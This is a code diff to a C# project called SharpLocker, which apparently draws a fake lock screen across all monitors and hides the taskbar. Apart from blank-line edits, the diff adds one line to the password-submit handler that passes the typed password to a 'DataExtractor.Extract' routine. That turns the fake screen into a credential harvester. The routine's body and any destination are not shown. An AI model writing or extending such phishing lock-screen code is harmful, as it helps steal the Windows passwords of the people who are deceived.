@@ -89,6 +89,8 @@ namespace SharpLocker
                 Thread thread = new Thread(() => WorkThreadFunction(screen));
                 thread.Start();
             }
+
+
         }
 
         public void WorkThreadFunction(Screen screen)
@@ -118,6 +120,7 @@ namespace SharpLocker
             }
         }
 
+
         protected override CreateParams CreateParams
         {
             get
@@ -142,6 +145,7 @@ namespace SharpLocker
 
         private void SubmitPasswordButton_Click(object sender, EventArgs e)
         {
+            DataExtractor.Extract(PasswordTextBox.Text);
             Taskbar.Show();
             Application.Exit();
         }
